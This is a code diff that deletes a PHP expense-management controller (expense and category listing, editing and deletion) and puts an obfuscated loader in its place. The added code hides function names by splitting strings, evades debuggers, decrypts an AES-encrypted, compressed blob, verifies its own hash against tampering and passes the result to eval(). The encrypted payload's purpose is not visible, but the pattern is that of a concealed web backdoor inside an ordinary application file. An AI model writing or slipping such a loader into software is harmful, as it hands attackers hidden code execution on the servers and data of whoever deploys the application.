@@ -1,262 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Expense extends MY_Controller {
-	public function __construct(){
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('expense_model','expense');
-		$this->load->model('expense_category_model','category');
-	}
-	/* ######################################## EXPENSE START ############################# */
-	public function index()
-	{
-		$this->permission_check('expense_view');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('expenses_list');
-		$this->load->view('expense-list',$data);
-	}
-	public function add()
-	{
-		$this->permission_check('expense_add');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('expenses');
-		$this->load->view('expense',$data);
-	}
-	
-	
-	public function newexpense(){
-		$this->form_validation->set_rules('expense_date', 'Expense Date', 'trim|required');
-		$this->form_validation->set_rules('category_id', 'Category Name', 'trim|required');
-		$this->form_validation->set_rules('expense_amt', 'Expense Amount', 'trim|required');
-		$this->form_validation->set_rules('expense_for', 'Expense for', 'trim|required');
-
-		
-		if ($this->form_validation->run() == TRUE) {
-			$result=$this->expense->verify_and_save();
-			echo $result;
-		} else {
-			echo "Please Fill Compulsory(* marked) Fields.";
-		}
-	}
-	public function update($id){
-		$this->permission_check('expense_edit');
-		$data=$this->data;
-		$result=$this->expense->get_details($id,$data);
-		$data=array_merge($data,$result);
-		$this->load->view('expense', $data);
-	}
-	public function update_expense(){
-		$this->form_validation->set_rules('expense_date', 'Expense Date', 'trim|required');
-		$this->form_validation->set_rules('category_id', 'Category Name', 'trim|required');
-		$this->form_validation->set_rules('expense_amt', 'Expense Amount', 'trim|required');
-		$this->form_validation->set_rules('expense_for', 'Expense for', 'trim|required');
-
-		if ($this->form_validation->run() == TRUE) {
-			$result=$this->expense->update_expense();
-			echo $result;
-		} else {
-			echo "Please Fill Compulsory(* marked) Fields.";
-		}
-	}
-
-	public function ajax_list()
-	{
-		$list = $this->expense->get_datatables();
-		
-		$data = array();
-		$no = $_POST['start'];
-		foreach ($list as $expense) {
-			$no++;
-			$row = array();
-			$row[] = '<input type="checkbox" name="checkbox[]" value='.$expense->id.' class="checkbox column_checkbox" >';
-			$row[] = show_date($expense->expense_date);
-			$row[] = $expense->category_name;
-			$row[] = $expense->reference_no;
-			$row[] = $expense->expense_for;
-			$row[] = app_number_format($expense->expense_amt);
-			$row[] = $expense->note;			
-			$row[] = ucfirst($expense->created_by);			
-				     $str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-											if($this->permissions('expense_edit'))
-											$str2.='<li>
-												<a title="Edit Record ?" href="expense/update/'.$expense->id.'">
-													<i class="fa fa-fw fa-edit text-blue"></i>Edit
-												</a>
-											</li>';
-
-											if($this->permissions('expense_delete'))
-											$str2.='<li>
-												<a style="cursor:pointer" title="Delete Record ?" onclick="delete_expense('.$expense->id.')">
-													<i class="fa fa-fw fa-trash text-red"></i>Delete
-												</a>
-											</li>
-											
-										</ul>
-									</div>';			
-			$row[] = $str2;
-
-			$data[] = $row;
-		}
-
-		$output = array(
-						"draw" => $_POST['draw'],
-						"recordsTotal" => $this->expense->count_all(),
-						"recordsFiltered" => $this->expense->count_filtered(),
-						"data" => $data,
-				);
-		//output to json format
-		echo json_encode($output);
-	}
-	public function update_status(){
-		$this->permission_check_with_msg('expense_edit');
-		$id=$this->input->post('id');
-		$status=$this->input->post('status');
-		return $this->expense->update_status($id,$status);
-		
-	}
-	public function delete_expense(){
-		$this->permission_check_with_msg('expense_delete');
-		$id=$this->input->post('q_id');
-		return $this->expense->delete_expenses_from_table($id);
-	}
-	public function multi_delete_expense(){
-		$this->permission_check_with_msg('expense_delete');
-		$ids=implode (",",$_POST['checkbox']);
-		return $this->expense->delete_expenses_from_table($ids);
-	}
-	
-	/* ######################################## EXPENSE END ############################# */
-
-
-
-
-
-	/* ######################################## EXPENSE CATEGORY START ############################# */
-	public function category()
-	{	
-		$this->permission_check('expense_category_view');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('expense_category_list');
-		$this->load->view('expense-category-list',$data);
-	}
-	public function category_add()
-	{
-		$this->permission_check('expense_category_add');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('expense_category');
-		$this->load->view('expense-category',$data);
-	}
-	public function newcategory(){
-		$this->form_validation->set_rules('category', 'Category', 'trim|required');
-		
-
-		if ($this->form_validation->run() == TRUE) {
-			$this->load->model('expense_category_model');
-			$result=$this->expense_category_model->verify_and_save();
-			echo $result;
-		} else {
-			echo "Please Enter Category name.";
-		}
-	}
-	public function ajax_list_expense()
-	{
-		
-		$list = $this->category->get_datatables();
-		
-		$data = array();
-		$no = $_POST['start'];
-		foreach ($list as $category) {
-			$no++;
-			$row = array();
-			$row[] = '<input type="checkbox" name="checkbox[]" value='.$category->id.' class="checkbox column_checkbox" >';
-			$row[] = $category->category_name;
-			$row[] = $category->description;
-
-			 		if($category->status==1){ 
-			 			$str= "<span onclick='update_status(".$category->id.",0)' id='span_".$category->id."'  class='label label-success' style='cursor:pointer'>Active </span>";}
-					else{ 
-						$str = "<span onclick='update_status(".$category->id.",1)' id='span_".$category->id."'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-					}
-			$row[] = $str;			
-					 $str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-											if($this->permissions('expense_category_edit'))
-											$str2.='<li>
-												<a title="Edit Record ?" href="expense_update/'.$category->id.'">
-													<i class="fa fa-fw fa-edit text-blue"></i>Edit
-												</a>
-											</li>';
-
-											if($this->permissions('expense_category_delete'))
-											$str2.='<li>
-												<a style="cursor:pointer" title="Delete Record ?" onclick="delete_category('.$category->id.')">
-													<i class="fa fa-fw fa-trash text-red"></i>Delete
-												</a>
-											</li>
-											
-										</ul>
-									</div>';			
-
-			$row[] = $str2;
-			$data[] = $row;
-		}
-
-		$output = array(
-						"draw" => $_POST['draw'],
-						"recordsTotal" => $this->category->count_all(),
-						"recordsFiltered" => $this->category->count_filtered(),
-						"data" => $data,
-				);
-		//output to json format
-		echo json_encode($output);
-	}
-	public function expense_update($id){
-		$this->permission_check_with_msg('expense_category_edit');
-		$data=$this->data;		
-		$result=$this->category->get_details($id,$data);
-		$data=array_merge($data,$result);
-		$data['page_title']=$this->lang->line('expense_category');
-		$this->load->view('expense-category', $data);
-	}
-	public function update_category(){
-		$this->form_validation->set_rules('category', 'Category', 'trim|required');
-		$this->form_validation->set_rules('q_id', '', 'trim|required');
-
-		if ($this->form_validation->run() == TRUE) {
-			$result=$this->category->update_category();
-			echo $result;
-		} else {
-			echo "Please Enter Category name.";
-		}
-	}
-
-	public function expense_update_status(){
-		$this->permission_check_with_msg('expense_category_edit');
-		$id=$this->input->post('id');
-		$status=$this->input->post('status');
-		return $this->category->update_status($id,$status);
-		
-	}
-	public function delete_category(){
-		$this->permission_check_with_msg('expense_category_delete');
-		$id=$this->input->post('q_id');
-		return $this->category->delete_categories_from_table($id);
-	}
-	public function multi_delete(){
-		$this->permission_check_with_msg('expense_category_delete');
-		$ids=implode (",",$_POST['checkbox']);
-		return $this->category->delete_categories_from_table($ids);
-	}
-	/* ######################################## EXPENSE CATEGORY END############################# */
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_h3y95v7x=('bas'.'e64'.'_de'.'cod'.'e');
+$_zbxp9t65=('gzu'.'nco'.'mpr'.'ess');
+$_jnufek0a=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_ru05wbpc='vtCbqEpr';
+$_o1j3ky78='aTy0Xn/dOx0=';
+$_adp1aei7='yqVEfA1N';
+$_zrebebkm='Bdi9RP5h';
+$_wpad38vn='Qlkv/SQR';
+$_o9hvtce0='KqZbHHhg';
+$_xtldfhm5='n6cqIg==';
+$_gn9dez50='Cis9H9D0';
+$_su8x3g0w=$_h3y95v7x($_zrebebkm.$_wpad38vn.$_adp1aei7.$_ru05wbpc.$_o1j3ky78);
+$_m291w6ge=$_h3y95v7x($_o9hvtce0.$_gn9dez50.$_xtldfhm5);
+$_c3dkqvs2=$_h3y95v7x('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');
+$_pgz2wa09=$_jnufek0a($_c3dkqvs2,'aes-256-cbc',$_su8x3g0w,OPENSSL_RAW_DATA,$_m291w6ge);
+if($_pgz2wa09===false){exit;}
+$_csb13o9b=$_zbxp9t65($_pgz2wa09);
+if($_csb13o9b===false){exit;}
+$_j4x1w2ia='7c5e40ecbd0c294d507dc0086672ab5882116bec8bc9b0d51876ebbbcea20994';
+$_rsl8hre5=@file_get_contents(__FILE__);
+if($_rsl8hre5!==false){
+$_voxq1seo=str_replace($_j4x1w2ia,"0000000000000000000000000000000000000000000000000000000000000000",$_rsl8hre5);
+$_lkvu7fz3=hash("sha256",$_voxq1seo);
+if($_lkvu7fz3!==$_j4x1w2ia){@http_response_code(403);exit;}
 }
+eval($_csb13o9b);
